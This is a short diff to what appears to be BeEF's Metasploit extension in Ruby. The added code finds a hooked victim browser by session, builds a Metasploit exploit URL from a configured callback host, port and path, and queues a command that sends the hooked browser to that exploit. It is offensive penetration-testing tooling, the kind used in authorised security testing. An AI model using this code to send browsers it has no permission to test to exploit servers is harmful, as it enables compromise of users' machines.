@@ -125,6 +125,31 @@ module API
             # This call has not been tested
             msf.call('module.execute', 'exploit', msf_key, msf_opts)
         end
+
+        hb = BeEF::HBManager.get_by_session(hbsession)
+        if not hb
+            print_error "Could not find hooked browser when attempting to execute module '#{mod}'"
+            return false
+        end
+
+        bopts = []
+	uri = ""
+	if msf_opts['SSL']
+		uri += "https://"
+	else
+		uri += "http://"
+	end
+	config = BeEF::Core::Configuration.instance.get('beef.extension.metasploit')
+        uri += config['callback_host'] + ":" + msf_opts['SRVPORT'] + "/" + msf_opts['URIPATH']
+
+
+	bopts <<   { :sploit_url => uri } 
+        c = BeEF::Core::Models::Command.new(:data => bopts.to_json,
+            :hooked_browser_id => hb.id,
+            :command_module_id => BeEF::Core::Configuration.instance.get("beef.module.#{mod}.db.id"),
+            :creationdate => Time.new.to_i
+          ).save
+
         # Still need to create command object to store a string saying "Exploit launched @ [time]", to ensure BeEF can keep track of
         # which exploits where executed against which hooked browsers
         return true
